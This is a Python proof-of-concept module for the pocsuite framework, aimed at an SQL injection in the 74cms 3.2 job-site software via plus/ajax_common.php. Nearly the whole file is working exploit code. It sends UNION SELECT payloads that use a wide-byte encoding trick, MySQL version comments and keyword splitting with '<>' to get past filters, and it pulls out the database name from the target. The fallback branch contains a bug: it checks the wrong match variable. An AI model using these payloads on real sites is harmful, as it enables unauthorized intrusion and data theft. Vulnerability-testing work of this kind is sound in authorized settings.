#!/usr/bin/python
# -*- coding:utf-8 -*-

import string
import random
import time
import re
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register


class TestPOC(POCBase):
    name = '74cms 3.2  ajax_common.php sql injection'
    vulID = '0'
    author = ['LRestless']
    vulType = 'sql-inj'
    version = '1'
    references = ['https://shuimugan.com/bug/view?bug_no=63225']
    desc = '''74cms 3.2  ajax_common.php sql injection'''

    vulDate = '2014-09-03'
    createDate = '2019-03-29'
    updateDate = '2019-03-29'

    appName = '74cms'
    appVersion = '3.2'
    appPowerLink = 'http://www.74cms.com'
    samples = ['re']

    def _attack(self):
        """attack mode"""
        result = {}
        s = req.Session()
        s.get(self.url)
        self.url = self.url.strip('/') + "/plus/ajax_common.php"
        payload1 = "?act=hotword&query=%E9%8C%A6'union+/*!50000SeLect*/+1,(select concat(0x7e,database(),0x7e)),3%23"
        url1 = self.url + payload1
        resp1 = s.get(url1)
        dbname1 = re.search('~(.*?)~', resp1.content)
        if dbname1:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['Database'] = {}
            result['Database']['DBname'] = dbname1.group(1)
        else:
            payload2 = "?act=hotword&query=%E9%8C%A6%27%20a<>nd%201=2%20un<>ion%20sel<>ect%201,(sel<>ect%20con<>cat(0x7e,data<>base(),0x7e)),3%23"
            url2 = self.url + payload2
            resp2 = s.get(url2)
            dbname2 = re.search('~(.*?)~', resp2.content)
            if dbname1:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['Database'] = {}
                result['Database']['DBname'] = dbname2.group(1)
        return self.parse_output(result)

    def _verify(self):
        """verify  mode"""
        result = {}
        s = req.Session()
        s.get(self.url)
        self.url = self.url.strip('/') + "/plus/ajax_common.php"
        payload1 = "?act=hotword&query=%E9%8C%A6%27union+/*!50000SeLect*/+1,md5%281%29,3%23"
        payload2 = "?act=hotword&query=%E9%8C%A6%27%20a<>nd%201=2%20un<>ion%20sel<>ect%201,md5(1),3%23"
        url1 = self.url + payload1
        url2 = self.url + payload2
        resp1 = s.get(url1)
        resp2 = s.get(url2)
        time.sleep(2)
        if 'c4ca4238a0b923820dcc509a6f75849b' in resp1.content or 'c4ca4238a0b923820dcc509a6f75849b' in resp2.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)

